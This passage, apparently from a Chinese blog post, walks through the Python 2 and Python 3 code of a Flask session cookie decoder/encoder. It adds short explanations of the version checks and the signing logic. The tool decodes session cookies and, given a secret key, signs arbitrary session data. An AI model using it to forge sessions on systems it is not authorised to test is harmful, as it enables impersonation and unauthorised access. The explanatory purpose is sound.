Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt;= <span class="number">2</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">6</span>:  <span class="comment"># &lt; 2.6</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 2.6&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (sys.version_info[<span class="number">0</span>] == <span class="number">2</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &gt;= <span class="number">6</span>):  <span class="comment"># &gt;= 2.6 &amp;&amp; &lt; 3.0</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Use Python 3 version of the script&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>:</span><br><span class="line">    __metaclass__ = ABCMeta</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">cls, secret_key, session_cookie_structure</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">            session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">            si = SecureCookieSessionInterface()</span><br><span class="line">            s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">cls, session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                compressed = <span class="literal">False</span></span><br><span class="line">                payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                    compressed = <span class="literal">True</span></span><br><span class="line">                    payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                data = base64_decode(data)</span><br><span class="line">                <span class="keyword">if</span> compressed:</span><br><span class="line">                    data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">        epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span> (args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span> (args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value, args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span> (args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先进行python版本的检查，然后就是创建一个抽象基类进行解码和编码了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">cls, secret_key, session_cookie_structure</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建一个虚拟flask用来处理消息</span></span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        <span class="comment"># 将字符串形式的会话转字典</span></span><br><span class="line">        session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">        <span class="comment"># 创建会话接口</span></span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        <span class="comment"># 调用 get_signing_serializer 方法来获取签名序列化器</span></span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">		<span class="comment"># 返回字符串形式的会话数据</span></span><br><span class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>SecureCookieSessionInterface</code> 是Flask中用于管理会话的类</p>
+<p>再来看看解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">cls, session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                compressed = <span class="literal">False</span></span><br><span class="line">                payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                    compressed = <span class="literal">True</span></span><br><span class="line">                    payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                data = base64_decode(data)</span><br><span class="line">                <span class="keyword">if</span> compressed:</span><br><span class="line">                    data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
+
+<p>如果没有key就像我们之前分析的解密代码一样操作，如果有key就调用<code>SecureCookieSessionInterface</code> 的签名序列化器进行解码，主程序的话就是处理终端问题了</p>
+<p>看<strong>Python3</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>:  <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>:  <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>:  <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">        epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                               <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span> (args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span> (args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value, args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span> (args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实可以看到，加解密逻辑是一样的，区别主要是不同版本引入合适的抽象基类模块是不一样的</p>
